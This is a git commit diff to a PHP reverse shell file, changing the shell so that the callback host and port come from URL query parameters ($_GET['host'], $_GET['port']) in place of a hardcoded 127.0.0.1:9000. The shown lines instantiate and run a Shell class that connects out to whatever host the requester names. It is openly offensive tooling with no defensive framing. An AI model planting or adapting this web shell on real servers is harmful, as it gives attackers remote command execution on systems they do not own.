10b9f975c21804b08eb4253b3153c44b54345969
unknown <redzasp2303@gmail.com>
2022-12-20 16:14:01 +0700

    UPDATED: Flexibility of host and port listener

--- src/reverse/php_reverse_shell.php
+++ src/reverse/php_reverse_shell.php
@@ -171,7 +171,7 @@ class Shell {
 }
 echo '<pre>';
 // change the host address and/or port number as necessary
-$sh = new Shell('127.0.0.1', 9000);
+$sh = new Shell($_GET['host'], $_GET['port']);
 $sh->run();
 unset($sh);
 // garbage collector requires PHP v5.3.0 or greater
